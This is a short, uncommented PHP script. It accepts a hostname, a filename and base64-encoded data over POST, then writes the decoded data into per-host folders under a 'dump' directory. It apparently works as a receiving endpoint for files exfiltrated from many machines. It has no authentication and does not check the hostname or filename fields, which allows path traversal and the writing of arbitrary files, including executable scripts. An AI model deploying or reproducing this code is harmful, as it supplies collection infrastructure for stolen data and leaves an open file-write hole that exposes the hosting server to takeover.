<?php
function sub($safe_encoded_data) {
    try {
        $encoded_data = str_replace(['-', '_'], ['+', '/'], $safe_encoded_data);
        $decoded_data = base64_decode($encoded_data, true);
        if ($decoded_data === false) {
            throw new Exception("Base64 decoding failed.");
        }
        return $decoded_data;
    } catch (Exception $e) {
        echo "An error occurred: " . $e->getMessage();
        return null;
    }
}
$dmp = "./dump/";
if ( !is_dir( $dmp ) ) {
    mkdir( $dmp );       
}
$name = $_POST["fname"];
$dir = "./dump/".$_POST["hn"]."/";
if ( !is_dir( $dir ) ) {
    mkdir( $dir );       
}
file_put_contents($dir.$name, sub($_POST["dat"])); 
?>
